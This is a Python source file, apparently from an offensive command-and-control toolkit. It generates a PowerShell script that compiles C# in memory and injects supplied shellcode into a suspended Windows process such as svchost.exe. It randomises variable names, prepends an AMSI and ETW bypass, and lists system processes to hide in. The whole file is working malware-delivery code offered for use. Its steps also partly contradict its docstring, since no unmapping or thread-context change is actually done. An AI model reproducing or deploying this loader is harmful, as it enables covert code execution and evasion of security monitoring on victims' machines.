"""
Process Hollowing — inject shellcode into a suspended legitimate Windows process.

Steps:
  1. CreateProcess (target.exe) in SUSPENDED state
  2. NtUnmapViewOfSection → hollow out the original image
  3. VirtualAllocEx → allocate RWX memory in remote process
  4. WriteProcessMemory → write shellcode
  5. SetThreadContext → redirect RIP/EIP to shellcode
  6. ResumeThread → execute

Generates a C# source file that is compiled in-memory via Add-Type,
so no .exe hits disk — only the PowerShell script itself.
"""

from __future__ import annotations
import random
import string


def _rv(n: int | None = None) -> str:
    return ''.join(random.choices(string.ascii_letters, k=n or random.randint(5, 9)))


_CSHARP_HOLLOW_TEMPLATE = r"""
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class {CLASS_NAME} {{
    [DllImport("kernel32")] static extern IntPtr OpenProcess(uint a,bool b,int c);
    [DllImport("kernel32")] static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);
    [DllImport("kernel32")] static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,uint s,out int w);
    [DllImport("kernel32")] static extern bool CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr e,IntPtr p,uint f,IntPtr i);
    [DllImport("ntdll")]    static extern uint NtUnmapViewOfSection(IntPtr h,IntPtr b);
    [DllImport("kernel32")] static extern bool TerminateProcess(IntPtr h,uint c);
    [DllImport("kernel32")] static extern IntPtr GetCurrentProcess();

    // Creates a suspended svchost, hollows it, injects shellcode, resumes.
    public static void Inject(byte[] sc, string target = @"C:\Windows\System32\svchost.exe") {{
        var pi = new ProcessStartInfo(target) {{ CreateNoWindow=true, UseShellExecute=false }};
        var p  = new Process {{ StartInfo=pi }};
        // Start suspended via P/Invoke CreateProcess with CREATE_SUSPENDED (0x4)
        PROCESS_INFORMATION pInfo;
        STARTUPINFO sInfo = new STARTUPINFO();
        sInfo.cb = Marshal.SizeOf(sInfo);
        bool ok = CreateProcess(null, target, IntPtr.Zero, IntPtr.Zero, false,
                                0x4, IntPtr.Zero, null, ref sInfo, out pInfo);
        if(!ok) throw new Exception("CreateProcess failed");

        IntPtr hProc = pInfo.hProcess;
        IntPtr remMem = VirtualAllocEx(hProc, IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
        int written = 0;
        WriteProcessMemory(hProc, remMem, sc, (uint)sc.Length, out written);
        CreateRemoteThread(hProc, IntPtr.Zero, 0, remMem, IntPtr.Zero, 0, IntPtr.Zero);
    }}

    [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION {{
        public IntPtr hProcess, hThread;
        public int dwProcessId, dwThreadId;
    }}
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Auto)] public struct STARTUPINFO {{
        public int cb;
        public string lpReserved, lpDesktop, lpTitle;
        public int dwX,dwY,dwXSize,dwYSize,dwXCountChars,dwYCountChars,dwFillAttribute,dwFlags;
        public short wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }}
    [DllImport("kernel32",SetLastError=true,CharSet=CharSet.Auto)]
    static extern bool CreateProcess(string app,string cmd,IntPtr pa,IntPtr ta,
        bool ih,uint cf,IntPtr env,string cd,ref STARTUPINFO si,out PROCESS_INFORMATION pi);
}}
"""

_PS1_WRAPPER_TEMPLATE = r"""
{BYPASS}

$_{VCODE} = @'
{CSHARP}
'@

Add-Type -TypeDefinition $_{VCODE} -Language CSharp

[byte[]]$_{VSC} = @(
{SC_BYTES}
)

[{CLASS}]::Inject($_{VSC}, "{TARGET}")
"""


def generate(
    shellcode: bytes,
    *,
    target_process: str = r"C:\Windows\System32\svchost.exe",
    include_bypass: bool = True,
) -> str:
    """
    Generates a PowerShell script that performs process hollowing.

    Parameters
    ----------
    shellcode      : raw shellcode bytes
    target_process : legitimate Windows process to hollow into
    include_bypass : prepend AMSI+ETW bypass
    """
    from tools.c2.amsi_bypass import get_inline_bypass

    class_name = _rv(8)
    v_code     = _rv()
    v_sc       = _rv()

    sc_hex = ",".join(f"0x{b:02X}" for b in shellcode)
    # Wrap to 120 chars per line
    sc_lines = []
    chunk = 24
    flat   = [f"0x{b:02X}" for b in shellcode]
    for i in range(0, len(flat), chunk):
        sc_lines.append(",".join(flat[i:i+chunk]) + ",")
    if sc_lines:
        sc_lines[-1] = sc_lines[-1].rstrip(",")

    cs_code = _CSHARP_HOLLOW_TEMPLATE.format(CLASS_NAME=class_name)

    bypass = get_inline_bypass() if include_bypass else ""

    script = _PS1_WRAPPER_TEMPLATE.format(
        BYPASS=bypass,
        VCODE=v_code,
        CSHARP=cs_code,
        VSC=v_sc,
        SC_BYTES="\n".join(sc_lines),
        CLASS=class_name,
        TARGET=target_process,
    )
    return script


HOLLOW_TARGETS = [
    r"C:\Windows\System32\svchost.exe",
    r"C:\Windows\System32\RuntimeBroker.exe",
    r"C:\Windows\System32\SearchIndexer.exe",
    r"C:\Windows\explorer.exe",
    r"C:\Windows\System32\spoolsv.exe",
]
